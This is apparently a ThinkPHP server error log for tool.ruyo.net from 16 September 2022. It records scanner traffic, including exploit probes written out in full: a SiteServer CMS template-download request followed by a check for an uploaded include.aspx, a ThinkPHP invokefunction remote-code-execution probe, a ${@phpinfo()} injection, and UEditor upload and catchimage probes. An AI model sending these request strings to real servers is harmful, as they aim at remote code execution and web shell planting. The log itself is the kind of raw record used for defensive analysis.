---------------------------------------------------------------

[2022-09-16T00:21:45+08:00] 49.232.6.201 GET tool.ruyo.net/SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownload&userKeyPrefix=test&downloadUrl=aZlBAFKTavCnFX10p8sNYfr9FRNHM0slash0XP8EW1kEnDr4pNGA7T2XSz0yCY0add0MS3NiuXiz7rZruw8zMDybqtdhCgxw7u0ZCkLl9cxsma6ZWqYd0G56lB6242DFnwb6xxK4AudqJ0add0gNU9tDxOqBwAd37smw0equals00equals0&directoryName=sectest
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/SiteServer.html
---------------------------------------------------------------

[2022-09-16T01:51:58+08:00] 112.224.65.75 POST tool.ruyo.net/favicon/
[ error ] [8]未定义变量: icANDmask
[ error ] [8]未定义数组下标: 0
[ error ] [8]未定义数组下标: 31
[ error ] [8]未定义数组下标: 30
[ error ] [8]未定义数组下标: 29
[ error ] [8]未定义数组下标: 28
[ error ] [8]未定义数组下标: 27
[ error ] [8]未定义数组下标: 26
[ error ] [8]未定义数组下标: 25
[ error ] [8]未定义数组下标: 24
[ error ] [8]未定义数组下标: 23
[ error ] [8]未定义数组下标: 22
[ error ] [8]未定义数组下标: 21
[ error ] [8]未定义数组下标: 20
[ error ] [8]未定义数组下标: 19
[ error ] [8]未定义数组下标: 18
[ error ] [8]未定义数组下标: 17
[ error ] [8]未定义数组下标: 16
[ error ] [8]未定义数组下标: 15
[ error ] [8]未定义数组下标: 14
[ error ] [8]未定义数组下标: 13
[ error ] [8]未定义数组下标: 12
[ error ] [8]未定义数组下标: 11
[ error ] [8]未定义数组下标: 10
[ error ] [8]未定义数组下标: 9
[ error ] [8]未定义数组下标: 8
[ error ] [8]未定义数组下标: 7
[ error ] [8]未定义数组下标: 6
[ error ] [8]未定义数组下标: 5
[ error ] [8]未定义数组下标: 4
[ error ] [8]未定义数组下标: 3
[ error ] [8]未定义数组下标: 2
[ error ] [8]未定义数组下标: 1
[ error ] [8]未定义数组下标: 0
---------------------------------------------------------------

[2022-09-16T02:14:33+08:00] 20.187.250.7 GET tool.ruyo.net/data/admin/allowurl.txt
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/data.html
---------------------------------------------------------------

[2022-09-16T03:46:12+08:00] 14.36.38.179 POST tool.ruyo.net//Admin/Ueditor/index?action=uploadimage
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/Admin.html
---------------------------------------------------------------

[2022-09-16T04:09:48+08:00] 14.36.38.179 POST tool.ruyo.net//index.php?s=/admin/upload/uploadfile
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/admin.html
---------------------------------------------------------------

[2022-09-16T04:49:42+08:00] 14.36.38.179 GET tool.ruyo.net//module/action/param1/$%7B@phpinfo()%7D
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/module.html
---------------------------------------------------------------

[2022-09-16T04:51:00+08:00] 14.36.38.179 GET tool.ruyo.net//?s=/Home/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=md5&vars%5B1%5D%5B%5D=HelloThinkPHP
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/Home.html
---------------------------------------------------------------

[2022-09-16T05:10:41+08:00] 49.232.6.201 GET tool.ruyo.net/SiteFiles/SiteTemplates/sectest/include.aspx
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/SiteFiles.html
---------------------------------------------------------------

[2022-09-16T06:02:56+08:00] 14.36.38.179 POST tool.ruyo.net//?s=captcha&test=-1
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/captcha.html
---------------------------------------------------------------

[2022-09-16T06:02:56+08:00] 14.36.38.179 POST tool.ruyo.net//?s=captcha&test=-1
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/captcha.html
---------------------------------------------------------------

[2022-09-16T06:17:31+08:00] 14.36.38.179 GET tool.ruyo.net//inc/editor/net/controller.ashx?action=catchimage
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/inc.html
---------------------------------------------------------------

[2022-09-16T06:17:31+08:00] 14.36.38.179 GET tool.ruyo.net//ueditor/net/controller.ashx?action=catchimage
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/ueditor.html
---------------------------------------------------------------

[2022-09-16T06:17:32+08:00] 14.36.38.179 GET tool.ruyo.net//admin/ueditor/net/controller.ashx?action=catchimage
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/admin.html
---------------------------------------------------------------

[2022-09-16T06:17:32+08:00] 14.36.38.179 GET tool.ruyo.net//ewebeditor/ueditor/net/controller.ashx?action=catchimage
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/ewebeditor.html
---------------------------------------------------------------

[2022-09-16T06:17:33+08:00] 14.36.38.179 GET tool.ruyo.net//admin/ewebeditor/ueditor/net/controller.ashx?action=catchimage
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/admin.html
---------------------------------------------------------------

[2022-09-16T06:17:33+08:00] 14.36.38.179 GET tool.ruyo.net//Plugin/ueditor/net/controller.ashx?action=catchimage
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/Plugin.html
---------------------------------------------------------------

[2022-09-16T06:17:34+08:00] 14.36.38.179 GET tool.ruyo.net//assets/ueditor/net/controller.ashx?action=catchimage
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/assets.html
---------------------------------------------------------------

[2022-09-16T06:17:34+08:00] 14.36.38.179 GET tool.ruyo.net//Plugs/ueditor/net/controller.ashx?action=catchimage
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/Plugs.html
---------------------------------------------------------------

[2022-09-16T06:45:36+08:00] 157.55.39.125 GET tool.ruyo.net/sitemap.xml
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/sitemap.html
---------------------------------------------------------------

[2022-09-16T07:00:59+08:00] 207.46.13.166 GET tool.ruyo.net/atom.xml
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/atom.html
---------------------------------------------------------------

[2022-09-16T07:33:47+08:00] 207.46.13.170 GET tool.ruyo.net/sitemap_index.xml
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/sitemap_index.html
---------------------------------------------------------------

[2022-09-16T07:59:07+08:00] 157.55.39.126 GET tool.ruyo.net/sitemap.txt
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/sitemap.html
---------------------------------------------------------------

[2022-09-16T08:22:08+08:00] 157.55.39.126 GET tool.ruyo.net/sitemaps.xml
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/sitemaps.html
---------------------------------------------------------------

[2022-09-16T08:27:11+08:00] 157.55.39.126 GET tool.ruyo.net/sitemap.xml.gz
[ error ] [0]模板文件不存在:/data/wwwroot/tool.ruyo.net/application/index/view/index/sitemap.html
